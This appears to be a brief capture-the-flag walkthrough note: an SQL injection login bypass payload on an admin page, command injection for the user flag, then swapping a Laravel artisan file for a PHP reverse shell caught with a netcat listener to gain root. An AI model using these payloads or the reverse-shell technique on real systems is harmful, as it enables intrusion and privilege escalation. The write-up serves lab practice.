in admin auth page we past this payload
![[Pasted image 20250211181046.png]]
username=' or '1'='1'#&password=' or '1'='1'#

then we use command injection and get user flag
![[Pasted image 20250211181114.png]]

![[Pasted image 20250211210830.png]]
![[Pasted image 20250211210848.png]]
replace artisan on our reverse shell
mv /tmp/php-reverse-shell.php /var/www/laravel/artisan
get root access
nc -lvnp 1234
